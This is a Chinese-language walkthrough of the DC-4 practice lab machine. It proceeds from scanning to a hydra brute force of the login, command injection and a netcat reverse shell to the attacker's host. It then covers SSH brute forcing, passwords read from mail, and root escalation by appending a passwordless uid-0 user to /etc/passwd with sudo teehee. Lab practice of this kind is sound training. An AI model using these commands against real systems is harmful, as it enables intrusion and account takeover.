---
title: DC4
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-15T20:55:06+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
==> 192.168.121.147
```

访问得到一个基础的登录界面，简单浏览一下开始扫描端口和目录

```
nmap -A 192.168.121.147 -T4 -p-
```

![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\nmap.png)

开放了ssh连接,80端口主页面

扫描目录

```
gobuster dir -u http://192.168.121.147 -w /usr/share/wordlists/dirb/big.txt
```

只能扫描到index.php和login.php，能够拿到的信息太少了，换了一个目录扫描器，稍微能得到多一点的路径了，不过最终都会被定向到index.php,手动和sqlmap测试sql无果后，打算用漏扫再扫一次

![漏扫](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\漏扫.png)

只能扫出来几个不太重要的中低威漏洞

尝试使用byp4xx绕过访问css也失败了，最后再尝试一下爆破

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.121.147 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
```

得到了管理员账户和密码，终于进入后台![back](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\back.png)

看一下工具逻辑，工具会把我们的命令显示在页面上，看一下是怎么传递的这个命令,bp抓包发现，该命令通过post提交表单，并将执行的结果返回到页面上，尝试反弹shell

最后是使用nc命令反弹成功了

```
nc -e /bin/bash 192.168.121.135 7777
```

![shell1](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\shell1.png)

使用python升级交互式

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

尝试sudo -l命令，需要我们输入当前用户的密码，估计又是需要利用服务器版本漏洞进行提权，先看看服务器上有什么，在home目录下找到三个用户，jim目录下存在old-passwords.bak文件，但是不允许我们读取mybox,应该是只能当前用户读取，我们可以尝试利用jim用户登录ssh

```
hydra -l jim -P password.txt -t 10 ssh://192.168.121.147
```

![password](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\password.png)

能够看到密码为jibril04,登录ssh,成功登录，应该是可以看到mobx里面的内容了

```
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
```

是一封邮件，是root用户发给jim用户的，可能是要利用邮件服务进行提权，网上查找一下文章也没有什么收获，或许是邮件服务不能用于提权，看了下思路，要去位于/var/mail目录下寻找邮件

jim下的邮件内容

```
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles

```

得到charles的密码  ^xHhA&hvim0y

切换用户

```
su charles
sudo -l
```

查看一下可以root用户执行的命令![su -l](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\su -l.png)

采用teehee进行提权，上网搜索teehee提权，可以利用teehee自主创建用户

```
echo "uu2fu3o::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

创建一个用户名为uu2fu3o的用户。并且uid为0即root权限，密码为空，可以直接登录

```
su - uu2fu3o
```

成功提权root![root](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\root.png)

最后去寻找flag即可

![flag](E:\笔记软件\笔记\渗透测试\靶机练习\DC4图库\flag.png)

总结：提权部分相较于上几个靶机算是比较简单了，但是最开始的登录框确实比较难搞。存在很多不确定的因素，依旧是老问题，给你一个登录框你能进行什么操作，而不仅仅是一个sql一个爆破就完了；在拿到反向shell之后对于服务器信息的探测也非常重要